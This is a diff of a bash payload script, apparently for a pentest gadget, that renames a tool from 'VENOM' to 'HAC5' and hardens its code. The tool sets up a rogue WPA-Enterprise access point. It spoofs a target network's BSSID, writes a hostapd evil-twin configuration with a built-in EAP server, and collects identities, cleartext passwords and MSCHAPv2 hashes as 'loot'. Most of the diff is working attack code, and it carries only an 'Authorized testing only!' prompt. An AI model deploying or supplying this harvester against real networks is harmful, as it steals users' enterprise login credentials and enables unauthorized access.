@@ -1,5 +1,5 @@
 #!/bin/bash
-# Title: VENOM - WPA-Enterprise Credential Harvester
+# Title: HAC5 - WPA-Enterprise Credential Harvester
 # Author: sinXneo
 # Description: Deploys rogue WPA-Enterprise AP to capture EAP identities and credentials
 # Version: 1.0
@@ -15,16 +15,16 @@
 # ============================================
 
 # Loot and temp directories
-LOOT_DIR="/root/loot/venom"
-TEMP_DIR="/tmp/venom"
+LOOT_DIR="/root/loot/hac5"
+TEMP_DIR="/tmp/hac5"
 CERT_DIR="$TEMP_DIR/certs"
-HOSTAPD_CONF="$TEMP_DIR/hostapd-venom.conf"
+HOSTAPD_CONF="$TEMP_DIR/hostapd-hac5.conf"
 EAP_USER_FILE="$TEMP_DIR/eap_users"
 HOSTAPD_LOG="$TEMP_DIR/hostapd.log"
 TCPDUMP_PCAP="$TEMP_DIR/eap_capture.pcap"
 
 # Rogue AP settings
-VENOM_IFACE="wlan_venom"
+VENOM_IFACE="wlan_hac5"
 PHY_DEVICE="phy1"
 DEFAULT_CHANNEL=6
 DEFAULT_HW_MODE="g"
@@ -534,38 +534,48 @@ create_virtual_interface() {
     pkill -f "hostapd.*$VENOM_IFACE" 2>/dev/null
     sleep 1
 
-    # Remove if exists
+    # Remove if exists to ensure a clean slate
     if iw dev "$VENOM_IFACE" info >/dev/null 2>&1; then
         ifconfig "$VENOM_IFACE" down 2>/dev/null
         iw dev "$VENOM_IFACE" del 2>/dev/null
         sleep 1
     fi
 
-    # Create AP interface on phy1 (secondary radio)
-    iw phy "$PHY_DEVICE" interface add "$VENOM_IFACE" type __ap 2>/dev/null
-
-    if ! iw dev "$VENOM_IFACE" info >/dev/null 2>&1; then
-        # Fallback: try managed type
-        iw phy "$PHY_DEVICE" interface add "$VENOM_IFACE" type managed 2>/dev/null
+    # Check if PHY exists
+    if ! iw phy "$PHY_DEVICE" info >/dev/null 2>&1; then
+        logboth red "Radio $PHY_DEVICE not found!"
+        logboth yellow "Falling back to phy0..."
+        PHY_DEVICE="phy0"
+        if ! iw phy "$PHY_DEVICE" info >/dev/null 2>&1; then
+            logboth red "No usable radio found (phy0/phy1)"
+            return 1
+        fi
     fi
 
-    if ! iw dev "$VENOM_IFACE" info >/dev/null 2>&1; then
-        logboth red "Failed to create $VENOM_IFACE on $PHY_DEVICE"
-        return 1
+    # Create AP interface
+    # This is non-destructive to the physical radio's other interfaces
+    if ! iw phy "$PHY_DEVICE" interface add "$VENOM_IFACE" type __ap 2>/dev/null; then
+        # Some drivers require 'managed' type first, hostapd will switch it
+        if ! iw phy "$PHY_DEVICE" interface add "$VENOM_IFACE" type managed 2>/dev/null; then
+            logboth red "Failed to create $VENOM_IFACE on $PHY_DEVICE"
+            return 1
+        fi
     fi
 
-    # BSSID Spoofing: Clone the target MAC if available
-    # If we don't have a target BSSID, use a randomized but valid one
+    # BSSID Spoofing
     if [ -n "$TARGET_BSSID" ]; then
         logboth "  - Spoofing BSSID: $TARGET_BSSID"
         ifconfig "$VENOM_IFACE" down 2>/dev/null
-        ifconfig "$VENOM_IFACE" hw ether "$TARGET_BSSID" 2>/dev/null
+        if ! ifconfig "$VENOM_IFACE" hw ether "$TARGET_BSSID" 2>/dev/null; then
+            logboth yellow "  - MAC spoofing failed (driver limitation)"
+        fi
     fi
 
-    ifconfig "$VENOM_IFACE" up 2>/dev/null
+    # Ensure it is DOWN. hostapd will manage the state.
+    ifconfig "$VENOM_IFACE" down 2>/dev/null
     sleep 1
 
-    logboth green "Interface $VENOM_IFACE created"
+    logboth green "Interface $VENOM_IFACE prepared"
     return 0
 }
 
@@ -601,6 +611,13 @@ write_hostapd_config() {
     local ssid="$1"
     local channel="$2"
 
+    logboth "Configuring hostapd for SSID: '$ssid'"
+
+    if [ -z "$ssid" ]; then
+        logboth red "Error: SSID is empty"
+        return 1
+    fi
+
     # Determine hw_mode based on channel
     local hw_mode="$DEFAULT_HW_MODE"
     if [ "$channel" -gt 14 ] 2>/dev/null; then
@@ -611,23 +628,19 @@ write_hostapd_config() {
 # VENOM - Rogue WPA-Enterprise AP
 interface=$VENOM_IFACE
 driver=nl80211
-ssid="$ssid"
+ssid=$ssid
 channel=$channel
 hw_mode=$hw_mode
 
 # WPA-Enterprise Settings
 wpa=2
-wpa_key_mgmt=WPA-EAP WPA-EAP-SHA256
+wpa_key_mgmt=WPA-EAP
 wpa_pairwise=CCMP
 rsn_pairwise=CCMP
 ieee8021x=1
 auth_algs=1
 
-# 802.11w Management Frame Protection (Optional - mimics modern APs)
-ieee80211w=1
-group_mgmt_cipher=AES-128-CMAC
-
-# Built-in EAP server (no external RADIUS needed)
+# Built-in EAP server
 eap_server=1
 eap_user_file=$EAP_USER_FILE
 fragment_size=1260
@@ -638,25 +651,22 @@ server_cert=$CERT_DIR/server.pem
 private_key=$CERT_DIR/server.key
 dh_file=$CERT_DIR/dh.pem
 
-# EAP-FAST Provisioning (Legacy support)
+# EAP-FAST Provisioning
 eap_fast_a_id=101112131415161718191a1b1c1d1e1f
 eap_fast_a_id_info=hostapd
 eap_fast_prov=3
 
-# Logging (Critical for capture)
+# Logging
 logger_syslog=-1
 logger_syslog_level=0
 logger_stdout=-1
 logger_stdout_level=0
 
-# Operational Tweaks (Mimic Cisco/Aruba)
+# Operational Tweaks
 ap_isolate=0
 ignore_broadcast_ssid=0
 wme_enabled=1
-ieee80211n=1
-ht_capab=[HT40+][SHORT-GI-40][DSSS_CCK-40]
-wpa_group_rekey=3600
-wpa_strict_rekey=1
+ieee80211n=0
 HOSTAPDEOF
 
     if [ -f "$HOSTAPD_CONF" ]; then
@@ -678,6 +688,10 @@ start_hostapd() {
 
     # Kill any existing instance on our interface
     pkill -f "hostapd.*$VENOM_IFACE" 2>/dev/null
+    sleep 1
+
+    # Ensure interface is down before hostapd starts
+    ifconfig "$VENOM_IFACE" down 2>/dev/null
     sleep 1
 
     # Start hostapd with max debug logging (uses standalone binary if needed)
@@ -859,7 +873,7 @@ parse_credentials() {
 
 live_monitor() {
     LOG ""
-    logboth green "=== VENOM ACTIVE ==="
+    logboth green "=== HAC5 ACTIVE ==="
     logboth green "Rogue AP: $TARGET_SSID"
     logboth green "Channel: $TARGET_CHANNEL"
     LOG ""
@@ -964,7 +978,7 @@ generate_report() {
 
     {
         echo "======================================"
-        echo "  VENOM - Engagement Report"
+        echo "  HAC5 - Engagement Report"
         echo "======================================"
         echo ""
         echo "Date:     $(date '+%Y-%m-%d %H:%M:%S')"
@@ -1066,7 +1080,7 @@ harvest_results() {
     # Display summary
     LOG ""
     LOG green "=========================================="
-    LOG green "  VENOM HARVEST COMPLETE"
+    LOG green "  HAC5 HARVEST COMPLETE"
     LOG green "=========================================="
     LOG ""
     LOG blue "Target:     $TARGET_SSID"
@@ -1093,10 +1107,10 @@ harvest_results() {
         sleep 0.3
         VIBRATE
         play_complete
-        ALERT "VENOM COMPLETE!\n\nIdentities: $IDENTITY_COUNT\nCleartext: $CLEARTEXT_COUNT\nMSCHAPv2: $MSCHAPV2_COUNT\n\nLoot saved"
+        ALERT "HAC5 COMPLETE!\n\nIdentities: $IDENTITY_COUNT\nCleartext: $CLEARTEXT_COUNT\nMSCHAPv2: $MSCHAPV2_COUNT\n\nLoot saved"
     else
         play_fail
-        ALERT "VENOM COMPLETE\n\nNo credentials captured\n\nRaw logs saved to:\n$SESSION_DIR"
+        ALERT "HAC5 COMPLETE\n\nNo credentials captured\n\nRaw logs saved to:\n$SESSION_DIR"
     fi
 }
 
@@ -1105,17 +1119,19 @@ harvest_results() {
 # ============================================
 
 LOG ""
-LOG red " __   _____ _  _  ___  __  __ "
-LOG red " \\ \\ / / __| \\| |/ _ \\|  \\/  |"
-LOG red "  \\ V /| _|| .\` | (_) | |\\/| |"
-LOG red "   \\_/ |___|_|\\_|\\___/|_|  |_|"
+LOG red "  _    _          _____ _____ "
+LOG red " | |  | |   /\   / ____| ____|"
+LOG red " | |__| |  /  \ | |    | |__  "
+LOG red " |  __  | / /\ \| |    |___ \ "
+LOG red " | |  | |/ ____ \ |____ ____| |"
+LOG red " |_|  |_/_/    \_\_____|_____/ "
 LOG ""
 LOG red "  WPA-Enterprise Credential Harvester"
 LOG red "  v1.0"
 LOG ""
 
 # Confirm start
-resp=$(CONFIRMATION_DIALOG "Start Venom?\n\nDeploys rogue WPA-Enterprise\nAP to capture credentials\n\nAuthorized testing only!")
+resp=$(CONFIRMATION_DIALOG "Start HAC5?\n\nDeploys rogue WPA-Enterprise\nAP to capture credentials\n\nAuthorized testing only!")
 case $? in
     $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED|$DUCKYSCRIPT_ERROR)
         LOG "Cancelled"
@@ -1243,5 +1259,5 @@ LOG blue "=== PHASE 4: HARVEST ==="
 harvest_results
 
 LOG ""
-LOG green "Venom complete"
+LOG green "HAC5 complete"
 exit 0
